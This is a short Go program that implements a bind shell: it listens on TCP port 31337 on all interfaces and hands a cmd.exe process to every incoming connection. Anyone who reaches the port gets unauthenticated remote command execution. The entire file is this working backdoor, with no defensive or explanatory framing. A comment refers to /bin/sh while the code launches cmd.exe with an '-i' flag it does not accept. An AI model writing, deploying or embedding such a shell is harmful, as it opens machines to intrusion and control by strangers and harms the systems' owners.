package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle2(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("cmd.exe", "-i")

	// Set stdin to our connection
	cmd.Stdin = conn

	// Create a Flusher from the connection to use for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn.
	cmd.Stdout = NewFlusher(conn)

	// Run the command.
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func handle(conn net.Conn) {
	cmd := exec.Command("cmd.exe", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":31337")

	if err != nil {
		log.Fatalln("Unable to bing to port")
	}

	log.Println("Listening on 0.0.0.0:31337")
	for {
		conn, err := listener.Accept()
		log.Println("Received Connection")
		if err != nil {
			log.Fatalln("unable to accept connection")
		}
		go handle(conn)
	}

}
